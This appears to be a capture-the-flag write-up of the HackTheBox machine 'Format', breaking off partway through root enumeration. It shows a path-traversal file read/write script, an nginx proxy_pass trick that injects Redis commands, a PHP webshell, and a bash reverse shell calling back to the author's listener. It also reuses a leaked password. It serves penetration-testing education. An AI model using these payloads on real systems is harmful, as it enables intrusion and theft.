HTB: Format
===========

![Format](https://0xdf.gitlab.io/img/format-cover.png)

Format hosts a primitive opensource microblogging site. I’ll abuse post creation to get arbitrary read and write on the host, and use that along with a proxy\_pass bug to poison Redis, giving my account “pro” status. With the upgraded status, I can access a writable directory that I can drop a webshell into and get a foothold on the box. To pivot to the user, I’ll get shared credentials out of the Redis database. To get to root, I’ll exploit a template injection in a Python script to leak the secret. In Beyond Root, I’ll look at two unintended solutions that were patched (mostly) ten days after release.

## Box Info

Name[Format](https://www.hackthebox.com/machines/format) [![Format](https://0xdf.gitlab.io/icons/box-format.png)](https://www.hackthebox.com/machines/format)

[Play on HackTheBox](https://www.hackthebox.com/machines/format)Release Date[13 May 2023](https://twitter.com/hackthebox_eu/status/1656675695890927618)Retire Date30 Sep 2023OSLinux ![Linux](https://0xdf.gitlab.io/icons/Linux.png)Base PointsMedium \[30\]Rated Difficulty![Rated difficulty for Format](https://0xdf.gitlab.io/img/format-diff.png)Radar Graph![Radar chart for Format](https://0xdf.gitlab.io/img/format-radar.png)![First Blood User](https://0xdf.gitlab.io/icons/first-blood-user.png)01:41:32 [![htbas9du](https://www.hackthebox.eu/badge/image/388108)](https://app.hackthebox.com/users/388108)

![First Blood Root](https://0xdf.gitlab.io/icons/first-blood-root.png)02:17:36 [![leigh](https://www.hackthebox.eu/badge/image/19107)](https://app.hackthebox.com/users/19107)

Creator[![coopertim13](https://www.hackthebox.eu/badge/image/55851)](https://app.hackthebox.com/users/55851)

## Recon

### nmap

`nmap` finds three open TCP ports, SSH (22) and HTTP (80):

```
oxdf@hacky$ nmap -p- --min-rate 10000 10.10.11.213
Starting Nmap 7.80 ( https://nmap.org ) at 2023-05-15 06:26 EDT
Nmap scan report for 10.10.11.213
Host is up (0.086s latency).
Not shown: 65532 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
3000/tcp open  ppp

Nmap done: 1 IP address (1 host up) scanned in 6.93 seconds
oxdf@hacky$ nmap -p 22,80,3000 -sCV 10.10.11.213
Starting Nmap 7.80 ( https://nmap.org ) at 2023-05-15 06:26 EDT
Nmap scan report for 10.10.11.213
Host is up (0.087s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
80/tcp   open  http    nginx 1.18.0
|_http-server-header: nginx/1.18.0
|_http-title: Site doesn't have a title (text/html).
3000/tcp open  http    nginx 1.18.0
|_http-server-header: nginx/1.18.0
|_http-title: Did not follow redirect to http://microblog.htb:3000/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.19 seconds

```

Based on the [OpenSSH](https://packages.debian.org/search?keywords=openssh-server) version, the host is likely running Debian 11 bullseye. There’s also a redirect on port 3000 to `microblog.htb`.

### Subdomain Brute Force

Given the use of the DNS name, I’ll brute force both web servers to see if either respond differently for any subdomains. Port 3000 doesn’t show anything:

```
oxdf@hacky$ ffuf -u http://10.10.11.213:3000 -H "Host: FUZZ.microblog.htb" -w /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -ac

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.0.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.11.213:3000
 :: Wordlist         : FUZZ: /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
 :: Header           : Host: FUZZ.microblog.htb
 :: Follow redirects : false
 :: Calibration      : true
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

:: Progress: [4989/4989] :: Job [1/1] :: 459 req/sec :: Duration: [0:00:11] :: Errors: 0 ::

```

Port 80 finds two different subdomains:

```
oxdf@hacky$ ffuf -u http://10.10.11.213 -H "Host: FUZZ.microblog.htb" -w /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -ac

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.0.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.11.213
 :: Wordlist         : FUZZ: /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
 :: Header           : Host: FUZZ.microblog.htb
 :: Follow redirects : false
 :: Calibration      : true
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

app                     [Status: 200, Size: 3976, Words: 899, Lines: 84, Duration: 94ms]
sunny                   [Status: 200, Size: 3732, Words: 630, Lines: 43, Duration: 92ms]
:: Progress: [4989/4989] :: Job [1/1] :: 456 req/sec :: Duration: [0:00:11] :: Errors: 0 ::

```

I’ll add the domain and both subdomains to my `/etc/hosts` file:

```
10.10.11.213 microblog.htb app.microblog.htb sunny.microblog.htb

```

### app.microblog.htb - TCP 80

#### Site

Visiting `http://10.10.11.213` returns a redirect to `app.microblog.htb`. On 80, visiting `http://microblog.htb` returns a default nginx 404 not found page.

`app.microblog.htb` looks like the front page for a microblog service:

![image-20230515064343340](https://0xdf.gitlab.io/img/image-20230515064343340.png)

The front page has links to register and login, as well as a “Get Blogging” button that points at `/dashboard`, but just redirects to the login form. There’s also a “Contribute here!” link that points to the service on port 3000, `http://microblog.htb:3000/cooper/microblog`.

It looks like the site is giving out subdomains (much how Gitlab has given me `0xdf.gitlab.io`). Visiting `sunny.microblog.htb` shows it is an example of this, a blog about the TV show [It’s Always Sunny in Philadelphia](https://www.imdb.com/title/tt0472954/):

![image-20230515065931263](https://0xdf.gitlab.io/img/image-20230515065931263.png)

I’m able to register for the site, and that leads to `/dashboard`:

![image-20230515065019704](https://0xdf.gitlab.io/img/image-20230515065019704.png)

There’s a reference a the bottom about “go pro to upload images for $5 / month”, but the link doesn’t work.

The only real interaction on the page is the ability to create a subdomain. It only accepts lowercase letters:

![image-20230515065113147](https://0xdf.gitlab.io/img/image-20230515065113147.png)

That filter is implemented client-side, as no request is sent. If I create `oxdf.microblog.htb`, it shows up in my dashboard:

![image-20230515065209756](https://0xdf.gitlab.io/img/image-20230515065209756.png)

If I try to register `sunny.microblog.htb`, it returns an error at the top of the page:

![image-20230515065348605](https://0xdf.gitlab.io/img/image-20230515065348605.png)

The “Edit Site” link on the dashboard leads to a crude editor, where I can add `h1` and `txt` sections:

![image-20230515065835682](https://0xdf.gitlab.io/img/image-20230515065835682.png)

Visiting the page shows similar format to the `sunny` page:

![image-20230515070352636](https://0xdf.gitlab.io/img/image-20230515070352636.png)

#### Tech Stack

The HTTP headers don’t give away what the site is running on other than nginx:

```
HTTP/1.1 200 OK
Server: nginx/1.18.0
Date: Mon, 15 May 2023 10:43:51 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 3976

```

However I am able to guess that the index pages in each directory `/` load as `index.php`, whereas `index.html` returns 404, so the site is built on PHP.

#### Directory Brute Force

I’ll run `feroxbuster` against the site, and include `-x php` since I know the site is PHP:

```
oxdf@hacky$ feroxbuster -u http://app.microblog.htb -x php

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.9.3
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://app.microblog.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.9.3
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💲  Extensions            │ [php]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        7l       11w      153c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
404      GET        1l        3w       16c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
301      GET        7l       11w      169c http://app.microblog.htb/logout => http://app.microblog.htb/logout/
301      GET        7l       11w      169c http://app.microblog.htb/register => http://app.microblog.htb/register/
301      GET        7l       11w      169c http://app.microblog.htb/login => http://app.microblog.htb/login/
200      GET      154l      843w   168397c http://app.microblog.htb/brain.ico
200      GET       83l      306w     3976c http://app.microblog.htb/index.php
200      GET     1308l     8063w   731222c http://app.microblog.htb/brain.png
200      GET       83l      306w     3976c http://app.microblog.htb/
302      GET        0l        0w        0c http://app.microblog.htb/logout/index.php => http://app.microblog.htb/
200      GET       60l      218w     3029c http://app.microblog.htb/register/index.php
301      GET        7l       11w      169c http://app.microblog.htb/dashboard => http://app.microblog.htb/dashboard/
200      GET       59l      167w     2475c http://app.microblog.htb/login/index.php
302      GET        0l        0w        0c http://app.microblog.htb/dashboard/index.php => http://app.microblog.htb/login
[####################] - 1m    150024/150024  0s      found:12      errors:0
[####################] - 1m     30000/30000   278/s   http://app.microblog.htb/
[####################] - 1m     30000/30000   279/s   http://app.microblog.htb/register/
[####################] - 1m     30000/30000   279/s   http://app.microblog.htb/logout/
[####################] - 1m     30000/30000   279/s   http://app.microblog.htb/login/
[####################] - 1m     30000/30000   279/s   http://app.microblog.htb/dashboard/

```

Nothing here that I didn’t know about already.

### microblog.htb - TCP 3000

#### Initial Enumeration

Port 3000 is hosting an instance of [Gitea](https://about.gitea.com/), an open-source Git hosting application:

![image-20230515070925413](https://0xdf.gitlab.io/img/image-20230515070925413.png)

![expand](https://0xdf.gitlab.io/icons/expand.png)

Under “explore”, I’ll find one repo (the same that was linked to on the main page):

![image-20230515071018857](https://0xdf.gitlab.io/img/image-20230515071018857.png)

The repo has the source for the site:

![image-20230515071727732](https://0xdf.gitlab.io/img/image-20230515071727732.png)

#### Source Overview

The `html` folder has a single `index.html` page which just contains a redirect to `app.microblog.htb`. `microbucket` has the static CSS and JavaScript files used by the site.

`pro-files` has a single file, `bulletproof.php`. It defines an `Image` class with a bunch of functions for it. It has a list of accepted mime types and extensions. It also forces the extension based on the mime type, to prevent `.php` uploads.

#### microblog-template

`microblog-template` has three folders and and `index.php`:

![image-20230515130831297](https://0xdf.gitlab.io/img/image-20230515130831297.png)

`index.php` seems to be the page for the blog post. It is using the Redis caching DB in multiple places. For example, there’s a `checkOwner` function:

```
function checkOwner() {
    if(checkAuth()) {
        $redis = new Redis();
        $redis->connect('/var/run/redis/redis.sock');
        $subdomain = array_shift((explode('.', $_SERVER['HTTP_HOST'])));
        $userSites = $redis->LRANGE($_SESSION['username'] . ":sites", 0, -1);
        if(in_array($subdomain, $userSites)) {
            return $_SESSION['username'];
        }
    }
    return "";
}

```

The site seems to store a list of file names in a file, `/content/order.txt`, which is loaded by a function named `fetchPage()`, and then looped over to read in files building `$html_content`:

```
function fetchPage() {
    chdir(getcwd() . "/content");
    $order = file("order.txt", FILE_IGNORE_NEW_LINES);
    $html_content = "";
    foreach($order as $line) {
        $temp = $html_content;
        $html_content = $temp . "<div class = \"{$line}\">" . file_get_contents($line) . "</div>";
    }
    return $html_content;
}

```

Then that is set into JavaScript in the page, which breaks it apart and puts it into the page:

```
    $(window).on('load', function(){
        const html = <?php echo json_encode(fetchPage()); ?>.replace(/(\r\n|\n|\r)/gm, "");
        $(".push-for-h1").after(html);
        if(html.length === 0) {
            $(".your-blog").after("<div class = \"empty-blog\">Blog in progress... check back soon!</div>");
            $(".push-for-h1").css("display", "none");
        }

```

There is a `content` directory in the repo, and it has an empty `order.txt`. `edit` has an `index.php` that managed editing the page and saving changes into `order.txt` and randomly named files.

Despite the site not offering any way to upgrade to Pro, there are checks in the PHP for this:

```
function provisionProUser() {
    if(isPro() === "true") {
        $blogName = trim(urldecode(getBlogName()));
        system("chmod +w /var/www/microblog/" . $blogName);
        system("chmod +w /var/www/microblog/" . $blogName . "/edit");
        system("cp /var/www/pro-files/bulletproof.php /var/www/microblog/" . $blogName . "/edit/");
        system("mkdir /var/www/microblog/" . $blogName . "/uploads && chmod 700 /var/www/microblog/" . $blogName . "/uploads");
        system("chmod -w /var/www/microblog/" . $blogName . "/edit && chmod -w /var/www/microblog/" . $blogName);
    }
    return;
}

```

It creates a `uploads/` directory, presumably to store images. There’s an `isPro` function as well, which checks Redis for the user’s status:

```
function isPro() {
    if(isset($_SESSION['username'])) {
        $redis = new Redis();
        $redis->connect('/var/run/redis/redis.sock');
        $pro = $redis->HGET($_SESSION['username'], "pro");
        return strval($pro);
    }
    return "false";
}

```

#### microblog

The `microblog` folder has two directories:

![image-20230515134552010](https://0xdf.gitlab.io/img/image-20230515134552010.png)

`sunny` is the example blog, and it has the same structure as the template. The `content` folder has `order.txt` along with some randomly named files:

![image-20230515134632412](https://0xdf.gitlab.io/img/image-20230515134632412.png)

The randomly named files each have tiny bits of HTML. For example, `2766wxkoacy` has:

```
<div class = "blog-h1 blue-fill"><b>It's Always Sunny in Philadelphia</b></div>

```

`order.txt` contains a list of the files:

```
2766wxkoacy
jtdpx1iea5
rle1v1hnms
syubx3wiu3e

```

The `app` folder has the source for the page where I can register / login. There’s not much here I need to find, except for how users are generated / stored in Redis. For example, at line 26 of `/register/index.php`:

```
    $redis = new Redis();
    $redis->connect('/var/run/redis/redis.sock');
    $username = $redis->HGET(trim($_POST['username']), "username");
    if(strlen(strval($username)) > 0) {
        header("Location: /register?message=User already exists&status=fail");
    }
    else {
        $redis->HSET(trim($_POST['username']), "username", trim($_POST['username']));
        $redis->HSET(trim($_POST['username']), "password", trim($_POST['password']));
        $redis->HSET(trim($_POST['username']), "first-name", trim($_POST['first-name']));
        $redis->HSET(trim($_POST['username']), "last-name", trim($_POST['last-name']));
        $redis->HSET(trim($_POST['username']), "pro", "false"); //not ready yet, license keys coming soon
        $_SESSION['username'] = trim($_POST['username']);
        header("Location: /dashboard?message=Registration successful!&status=success");
    }

```

It’s connecting to `unix:/var/run/redis/redis.sock`. It uses `HGET` and `HSET` to interact with the key for the username and set values for `username`, `password`, `first-name`, `last-name`, and `pro`.

## Shell as www-data

### File Read / Write

#### Identify

I noted above that the content is stored in files named with random characters. It turns out they are generated by clientside JS in the page at `/edit`:

```
$(".form-id").attr("value", Math.random().toString(36).slice(2));

```

So the POST request to create or edit a microblog looks like:

```
POST /edit/index.php HTTP/1.1
Host: oxdf.microblog.htb
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 23
Origin: http://oxdf.microblog.htb
Connection: close
Referer: http://oxdf.microblog.htb/edit/?message=Section%20added!&status=success
Cookie: username=rbb8bp6umb0logs0i3sqlcp5kc
Upgrade-Insecure-Requests: 1

id=u62ieddrsu&txt=test+text

```

This means that the user controls `id` going into this PHP at line 80 of `/edit/index.php`:

```
//add text
if (isset($_POST['txt']) && isset($_POST['id'])) {
    chdir(getcwd() . "/../content");
    $txt_nl = nl2br($_POST['txt']);
    $html = "<div class = \"blog-text\">{$txt_nl}</div>";
    $post_file = fopen("{$_POST['id']}", "w");
    fwrite($post_file, $html);
    fclose($post_file);
    $order_file = fopen("order.txt", "a");
    fwrite($order_file, $_POST['id'] . "\n");
    fclose($order_file);
    header("Location: /edit?message=Section added!&status=success");
}

```

As there is no sanitization on the ID, this gives arbitrary write or read as the current user. If the target is a file that the current user can write, then it will write the given text to that file. But even if it fails to write the text, that file is still added to `order.txt`, which means it’ll be read and shown on the microblog page.

#### Read POC

I’ll try reading `/etc/passwd` by setting the `id` parameter to point to it:

![image-20230515142908129](https://0xdf.gitlab.io/img/image-20230515142908129.png)

This is failing to write “test” to `/etc/passwd` because my user doesn’t have access, but then the traversal payload for `passwd` is written to `order.txt`, and then the contents get loaded into the page. It shows up on the site now as well.

![image-20230515143242706](https://0xdf.gitlab.io/img/image-20230515143242706.png)

#### File Read Script

Given the multiple steps to read a file, I’ll script this. Also, because the box is periodically clearing out accounts, I’ll just register a new account each time:

```
#!/usr/bin/env python3

import random
import re
import requests
import string
import sys

import warnings
warnings.filterwarnings("ignore", category=DeprecationWarning)

file = sys.argv[1] if len(sys.argv) > 1 else "/etc/passwd"

token = ''.join(random.choice(string.ascii_lowercase) for _ in range(20))
base_url = "http://app.microblog.htb"

sess = requests.session()
sess.proxies.update({"http": "http://127.0.0.1:8080"})

# register for site
body = {"first-name": token, "last-name": token, "username": token, "password": token}
resp = sess.post("http://app.microblog.htb/register/", data=body)

# create blog
resp = sess.post("http://app.microblog.htb/dashboard/", data={"new-blog-name": token})

# file read
resp = sess.post(f"http://microblog.htb/edit/",
                 data={"id": f"../../../../../../{file}", "txt":"0xdf"},
                 headers={"Host": f"{token}.microblog.htb"},
                 allow_redirects=False)
data = re.search(r'const html = "<div class = \\".+?\\">(.*?)<\\/', resp.text, re.DOTALL).group(1)
print(bytes(data, 'utf-8').decode('unicode_escape'))

```

The result allows me to request files:

```
oxdf@hacky$ python file_read.py /etc/passwd
root:x:0:0:root:\/root:\/bin\/bash
daemon:x:1:1:daemon:\/usr\/sbin:\/usr\/sbin\/nologin
...[snip]...
cooper:x:1000:1000::\/home\/cooper:\/bin\/bash
redis:x:103:33::\/var\/lib\/redis:\/usr\/sbin\/nologin
git:x:104:111:Git Version Control,,,:\/home\/git:\/bin\/bash
messagebus:x:105:112::\/nonexistent:\/usr\/sbin\/nologin
sshd:x:106:65534::\/run\/sshd:\/usr\/sbin\/nologin
_laurel:x:997:997::\/var\/log\/laurel:\/bin\/false
oxdf@hacky$ python file_read.py /proc/self/cmdline
php-fpm: pool www

```

#### File Write POC

I’ll find most attempts to write inside the current web directory fail. There is one directory that must be writable, and that’s `/content`. Trying to visit `/content` on a microblog site returns 403:

![image-20230515150546024](https://0xdf.gitlab.io/img/image-20230515150546024.png)

I know the site has to be able to write files in this folder. I’ll try to write there with a request like:

```
POST /edit/ HTTP/1.1
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
Host: efjexomlsilayjqmkqjj.microblog.htb
Cookie: username=90jlpppeeqlelf3fuc5q3efib2
Content-Length: 30
Content-Type: application/x-www-form-urlencoded

id=0xdf.txt&txt=0xdf+was+here!

```

It shows up on the page:

![image-20230515151034665](https://0xdf.gitlab.io/img/image-20230515151034665.png)

And visiting `/content/0xdf.txt` downloads the text file.

I’ll try with:

```
id=0xdf.php&txt=<?php+phpinfo();+?>

```

It seems to work, but visiting `/content/0xdf.php`, it just downloads the file, doesn’t execute it. In Burp, I’ll look at the response:

```
HTTP/1.1 200 OK
Server: nginx/1.18.0
Date: Mon, 15 May 2023 19:13:20 GMT
Content-Type: application/octet-stream
Content-Length: 58
Last-Modified: Mon, 15 May 2023 19:13:04 GMT
Connection: close
ETag: "64628440-3a"
Content-Disposition: attachment; filename=0xdf.php
Accept-Ranges: bytes

<div class = "blog-text"><?php echo "hello 0xdf"; ?></div>

```

It is returning this as a file, rather than executing it as PHP. This is likely due to the nginx configuration that is matching on this location and just adding the `Content-Disposition` header to set it as an attachment, rather than passing it to PHP for execution.

### Pro Access

#### nginx Config

To get a better look at how nginx is hosting and see if I missed any sub domains, I’ll look at the config file (using `grep` to remove comments):

```
oxdf@hacky$ python file_read.py /etc/nginx/sites-enabled/default | grep -vP "^\s*#"

server {
        listen 80 default_server;
        listen [::]:80 default_server;

        root \/var\/www\/html;

        index index.html index.htm index.nginx-debian.html;

        server_name _;

        location \/ {
                try_files $uri $uri\/ =404;
        }
}

server {
        listen 80;
        listen [::]:80;

        root \/var\/www\/microblog\/app;

        index index.html index.htm index-nginx-debian.html;

        server_name microblog.htb;

        location \/ {
                return 404;
        }

        location = \/static\/css\/health\/ {
                resolver 127.0.0.1;
                proxy_pass http:\/\/css.microbucket.htb\/health.txt;
        }

        location = \/static\/js\/health\/ {
                resolver 127.0.0.1;
                proxy_pass http:\/\/js.microbucket.htb\/health.txt;
        }

        location ~ \/static\/(.*)\/(.*) {
                resolver 127.0.0.1;
                proxy_pass http:\/\/$1.microbucket.htb\/$2;
        }
}

```

This isn’t the full nginx config. There must be more in other files (for things like the downloads from `/content`). I reasonably could guess the path to those, but I didn’t here. I’ll look at this a bit in [Beyond Root](#nginx-misconfiguration).

#### proxy\_pass Bug

That last block of the nginx config has a vulnerability in it. It will match on any URL of the form `/static/${1}/${2}`, and proxy it to `http://${1}.microbucket.htb/${2}`. This is simulating something like a scenario where different sites might have different cloud storage buckets set up. [This blog post](https://labs.detectify.com/2021/02/18/middleware-middleware-everywhere-and-lots-of-misconfigurations-to-fix/) has a really nice example of why this kind of pattern exists, and how to exploit it.

The idea is to abuse this to connect to a unix socket. From the post above, if I pass in:

```
GET /static/unix:%2fvar%2frun%2fredis%2fredis.sock:TEST/app.js HTTP/1.1
Host: example.com

```

Then this will make:

```
http://unix:/var/run/redis/redis.sock:TEST.microbucket.htb/app.js

```

That will end up sending this request to the socket:

```
GET TEST.microbucket.htb/app.js HTTP/1.0
Host: localhost

```

The post continues showing how to write keys. I can send a request that isn’t a valid HTTP verb (like GET or POST), and it still gets processed and passed by nginx. If I send this HTTP request:

```
MSET /static/unix:%2fvar%2frun%2fredis%2f/redis.sock:hacked%20%22true%22%20/anything.js HTTP 1.1
Host: app.microbucket.htb

```

That will reach the socket as:

```
MSET hacked "true" microbucket.htb/anything.js HTTP/1.0
Host: localhost

```

That will set the key `hacked` to true (and likely crash the rest of the command).

This is taking advantage of the fact that `MSET` allows for setting multiple keys in the same line.

There’s more in the post about getting RCE from this, but I wasn’t able to make that work on Format.

#### Redis Write POC

The keys I noted above were set with `HSET`, which according to the [docs](https://redis.io/commands/hset/), takes a key followed by field and value pairs. That should work similar to above, but rather than just key / value, I’ll pass field as well.

I’ll send:

```
HSET /static/unix:%2fvar%2frun%2fredis%2fredis.sock:oxdf%20%22first-name%22%20%22modified%22%20/0xdf.js HTTP/1.1
Host: microblog.htb

```

This will become:

```
HSET oxdf "first-name" "modified" HTTP/1.0
Host: localhost

```

I’ll send this, and the response is a crash:

![image-20230515160237326](https://0xdf.gitlab.io/img/image-20230515160237326.png)

But, on refresh, my first name is changed!

![image-20230515160255527](https://0xdf.gitlab.io/img/image-20230515160255527.png)

#### Pro Access

I don’t really want to change my name, but rather to get Pro status. I’ll change the field to “pro” and the value to “true”, and send again. On refresh, my page says Pro!

![image-20230515160423427](https://0xdf.gitlab.io/img/image-20230515160423427.png)

### WebShell

#### Pro Changes

With pro, my site exit now has an `img` option:

![image-20230515162509255](https://0xdf.gitlab.io/img/image-20230515162509255.png)

If I give it an image, it loads:

![image-20230515162746163](https://0xdf.gitlab.io/img/image-20230515162746163.png)

The image is located at `http://oxdf.microblog.htb/uploads/6462959cc8f1b2.38277097_gneojkiqpmhfl.png`.

I noted above that the client-side application forces a `.png` extension onto whatever I upload.

#### Write to /uploads

I’ll use the write vulnerability to write a `.php` file into `/uploads`:

```
POST /edit/index.php HTTP/1.1
Host: oxdf.microblog.htb
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 49
Origin: http://oxdf.microblog.htb
Cookie: username=rbb8bp6umb0logs0i3sqlcp5kc
Upgrade-Insecure-Requests: 1

id=../uploads/0xdf.php&txt=<?php+echo+"0xdf!";+?>

```

Now with Pro access, I can access this directory, and unlike the previous directory, this time the PHP executes:

![image-20230515163354827](https://0xdf.gitlab.io/img/image-20230515163354827.png)

#### Webshell -> Shell

I’ll resend the write request, but this time writing a simple PHP webshell:

```
POST /edit/index.php HTTP/1.1
Host: oxdf.microblog.htb
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 61
Origin: http://oxdf.microblog.htb
Cookie: username=rbb8bp6umb0logs0i3sqlcp5kc
Upgrade-Insecure-Requests: 1

id=../uploads/0xdf.php&txt=<?php+system($_REQUEST['cmd']);+?>

```

Now I’ll add `?cmd=[command]` to the url, and it works:

![image-20230515163515872](https://0xdf.gitlab.io/img/image-20230515163515872.png)

I’ll start `nc` listening on 443 and send this [bash reverse shell](https://www.youtube.com/watch?v=OjkVep2EIlw) in Firefox:

```
http://oxdf.microblog.htb/uploads/0xdf.php?cmd=bash -c 'bash -i >%26 /dev/tcp/10.10.14.6/443 0>%261'

```

There’s a connection:

```
oxdf@hacky$ nc -lnvp 443
Listening on 0.0.0.0 443
Connection received on 10.10.11.213 41734
bash: cannot set terminal process group (609): Inappropriate ioctl for device
bash: no job control in this shell
www-data@format:~/microblog/oxdf/uploads$

```

I’ll upgrade my shell using the [standard trick](https://www.youtube.com/watch?v=DqE6DxqJg8Q):

```
www-data@format:~/microblog/oxdf/uploads$ script /dev/null -c bash
script /dev/null -c bash
Script started, output log file is '/dev/null'.
www-data@format:~/microblog/oxdf/uploads$ ^Z
[1]+  Stopped                 nc -lnvp 443
oxdf@hacky$ stty raw -echo; fg
nc -lnvp 443
            reset
reset: unknown terminal type unknown
Terminal type? screen
www-data@format:~/microblog/oxdf/uploads$

```

## Shell as cooper

### Enumeration

#### Home Directories

There are two home directories on the box, `cooper` and `git`:

```
www-data@format:/home$ ls
cooper  git

```

www-data is able to enter `cooper`, and `user.txt` is there, but www-data can’t read it.

#### Redis

I’ll check out the Redis database. `redis-cli` is on the box, and `-s` allows it to connect to a socket, where there’s no other auth needed:

```
www-data@format:~$ redis-cli -s /var/run/redis/redis.sock
redis /var/run/redis/redis.sock>

```

`keys *` will show all the keys:

```
redis /var/run/redis/redis.sock> keys *
1) "cooper.dooper:sites"
2) "cooper.dooper"
3) "oxdf"
4) "PHPREDIS_SESSION:rbb8bp6umb0logs0i3sqlcp5kc"
5) "oxdf:sites"

```

`oxdf:sites` and `cooper.dooper:sites` are the lists of sites for that user. It’s generated in the source with `LPUSH`, pushing items onto a list. `LRANGE` reads a list, taking a start and stop index. The [docs](https://redis.io/commands/lrange/) show that if the stop is -1, it’ll read to the end, so I can read the full lists:

```
redis /var/run/redis/redis.sock> LRANGE oxdf:sites 0 -1
1) "oxdf"
redis /var/run/redis/redis.sock> LRANGE cooper.dooper:sites 0 -1
1) "sunny"

```

`HGETALL` will dump all the fields in a hash:

```
redis /var/run/redis/redis.sock> HGETALL oxdf
 1) "username"
 2) "oxdf"
 3) "password"
 4) "oxdf"
 5) "first-name"
 6) "modified"
 7) "last-name"
 8) "oxdf"
 9) "pro"
10) "true"
11) "first-nameedit"
12) "modified"
13) ".microbucket.htb/0xdf.js"
14) "HTTP/1.0"

```

It seems to return the field as one, followed by the value in the next. 13 and 14 are artifacts of my injection in the previous step.

```
redis /var/run/redis/redis.sock> HGETALL cooper.dooper
 1) "username"
 2) "cooper.dooper"
 3) "password"
 4) "zooperdoopercooper"
 5) "first-name"
 6) "Cooper"
 7) "last-name"
 8) "Dooper"
 9) "pro"
10) "false"

```

4 is the password for the cooper.dooper user.

### SSH / su

That password works for the cooper user on the box with `su`:

```
www-data@format:~$ su - cooper
Password:
cooper@format:~$

```

It also works for SSH:

```
oxdf@hacky$ sshpass -p 'zooperdoopercooper' ssh cooper@10.10.11.213
...[snip]...
cooper@format:~$

```

Either way I can claim `user.txt`:

```
cooper@format:~$ cat user.txt
2546f1e9************************

```

## Shell as root

### Enumeration

#### sudo

cooper can run `license` as root:

```
cooper@format:~$ sudo -l
[sudo] password for cooper:
Matching Defaults entries for cooper on format:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User cooper may run the following commands on format:
    (root) /usr/bin/license

```

`sudo` requires a password, but I have that.

#### license

`licence` is a Python script:

```
cooper@format:~$ file /usr/bin/license
/usr/bin/license: Python script, ASCII text executable

```

The script clearly checks that it’s running as root before doing anything else:

```
cooper@format:~$ license

Microblog license key manager can only be run as root

cooper@format:~$ sudo license
usage: license [-h] (-p username | -d username | -c license_key)
license: error: one of the arguments -p/--provision -d/--deprovision -c/--check is required

```

It starts with a `License` class:

```
class License():
    def __init__(self):
        chars = string.ascii_letters + string.digits + string.punctuation
        self.license = ''.join(random.choice(chars) for i in range(40))
        self.created = date.today()

```

This gives each object a random 40 characters.

There’s a check for running as root, and then argparsing to generate the args noted above. Then it loads the contents of a secret from `/root/license/secret`:

```
r = redis.Redis(unix_socket_path='/var/run/redis/redis.sock')

secret = [line.strip() for line in open("/root/license/secret")][0]
secret_encoded = secret.encode()
salt = b'microblogsalt123'
kdf = PBKDF2HMAC(algorithm=hashes.SHA256(),length=32,salt=salt,iterations=100000,backend=default_backend())
encryption_key = base64.urlsafe_b64encode(kdf.derive(secret_encoded))

```

